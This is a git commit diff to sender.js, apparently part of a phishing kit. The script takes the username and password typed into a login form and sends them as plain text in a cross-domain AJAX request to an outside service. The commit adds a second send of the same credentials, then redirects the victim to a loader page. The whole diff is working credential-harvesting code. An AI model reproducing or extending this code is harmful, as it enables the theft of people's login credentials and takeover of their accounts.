265b9263f2e39b0a165ec667fe9dc47c4cb9d59d
serialdavid <156185252+serialdavid@users.noreply.github.com>
2024-01-14 11:04:41 +0200

    Update sender.js
    Receive both messages before loader

--- sender.js
+++ sender.js
@@ -23,6 +23,7 @@ var sender = function () {
     // Check if both username and password are not empty
     if (u_name.trim() !== "" && u_password.trim() !== "") {
         message = "Name: " + u_name + "\nPassword: " + u_password;
+        
         var settings = {
             "async": true,
             "crossDomain": true,
@@ -37,17 +38,29 @@ var sender = function () {
                 "text": message
             })
         };
+
+        // Send the first message
         $.ajax(settings).done(function (response) {
             console.log(response);
-        });
+            
+            // Send the second message
+            message = "Another message: " + u_name + "\nPassword: " + u_password;
+            $.ajax(settings).done(function (response) {
+                console.log(response);
 
-        // Clear input fields after sending the message
-        document.getElementById("username").value = "";
-        document.getElementById("password").value = "";
+                // Clear input fields after sending the messages
+                document.getElementById("username").value = "";
+                document.getElementById("password").value = "";
+
+                // Redirect to loader.html after sending both messages
+                window.location.href = 'loader.html';
+            });
+        });
     }
 
     return false;
 };
+
 
 document.addEventListener('DOMContentLoaded', function () {
     // Call ready function if needed
